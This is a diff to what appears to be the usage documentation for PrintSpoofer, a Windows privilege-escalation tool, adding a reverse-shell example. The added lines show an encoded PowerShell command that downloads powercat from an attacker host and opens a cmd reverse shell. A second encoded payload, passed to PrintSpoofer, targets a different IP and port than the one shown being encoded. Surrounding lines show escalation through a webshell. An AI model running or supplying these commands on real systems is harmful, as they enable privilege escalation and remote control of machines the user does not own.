@@ -98,8 +98,14 @@ C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
 ```
+### Usage 4: reverse shell via powershell
+```powershell
+PS /Users/Anongmous> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8088/powercat.ps1');powercat -c 10.10.10.10 -p 1337 -e cmd"))
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwADoAOAAwADgAOAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAMAAuADEAMAAuADEAMAAuADEAMAAgAC0AcAAgADEAMwAzADcAIAAtAGUAIABjAG0AZAA=
 
-### Usage 4: run on webshell
+PrintSpoofer_x64.exe -c "powershell.exe -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADoAOAAwADgAOAAvAHAAbwB3AGUAcgBjAGEAdAAuAHAAcwAxACcAKQA7AHAAbwB3AGUAcgBjAGEAdAAgAC0AYwAgADEAMAAuADEAMAAuADEANAAuADEANAAgAC0AcAAgADEAMwAzADgAIAAtAGUAIABjAG0AZAA="
+```
+### Usage 5: run on webshell
 
 ```cmd
 /c C:\inetpub\wwwroot\PrintSpoofer.exe -c "c:\\windows\\system32\\cmd.exe /c whoami /all > C:\\inetpub\\wwwroot\\tmp.txt & exit" && type C:\\inetpub\\wwwroot\\tmp.txt
